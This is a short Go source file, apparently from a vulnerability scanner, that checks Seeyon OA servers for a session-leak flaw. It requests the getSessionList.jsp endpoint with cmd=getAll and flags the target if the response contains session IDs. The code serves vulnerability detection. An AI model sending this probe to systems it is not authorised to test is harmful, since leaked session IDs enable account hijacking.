package seeyon

import (
	"github.com/yhy0/ChYing/pkg/Jie/pkg/protocols/httpx"
	"strings"
)

// getSessionList.jsp session 泄露

func GetSessionList(u string, client *httpx.Client) bool {
	if req, err := client.Request(u+"/yyoa/ext/https/getSessionList.jsp?cmd=getAll", "GET", "", nil, "Poc SeeYon"); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "sessionID") {
			return true
		}
	}
	return false
}
